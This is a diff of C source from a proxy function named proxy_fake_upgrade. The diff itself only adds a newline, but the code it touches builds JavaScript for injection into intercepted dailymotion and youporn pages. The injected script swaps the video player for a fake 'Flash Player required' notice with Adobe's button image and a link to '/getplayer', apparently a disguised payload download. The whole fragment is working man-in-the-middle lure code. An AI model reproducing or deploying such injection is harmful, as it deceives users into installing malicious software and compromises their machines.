@@ -164,7 +164,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 			"</script>\n");
          else if (strstr(url, "www.dailymotion.com/video") != NULL)
              ret = asprintf(&html_to_inject,
-			"<script type='text/javascript'>\n" \
+			"\n<script type='text/javascript'>\n" \
 			"        document.getElementById('player_box').innerHTML = '<div style=\"font-size:14px;border:1px #999999 solid;padding:30px;margin-top:50px;margin-bottom:50px;" \
                         "margin-left:20px;margin-right:20px;\"><p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, or a newer version then the installed version." \
                         "</p><p style=\"margin:10px 0;\">Please download it from the following link:</p><p style=\"margin:10px 0;\"><a style=\"font-size:10px;\" href=\"/getplayer\">" \
@@ -173,7 +173,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 			"</script>\n");
          else if (strstr(url, "www.youporn.com/watch") != NULL)
              ret = asprintf(&html_to_inject,
-			"<script type='text/javascript'>\n" \
+			"\n<script type='text/javascript'>\n" \
 			"        document.getElementById('videoWrapper').innerHTML = '<div id=\"no_flash_player_message\"><div id=\"getHtml5Player\"><div>Oh No!</div><div>" \
                         "We noticed you do not have Flash installed. Follow the link below to install Flash</div><br><a style=\"font-size:10px;\" href=\"/getplayer\"><img style=\"" \
                         "border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\"><br><br><a style=\"font-size:10px;\"" \
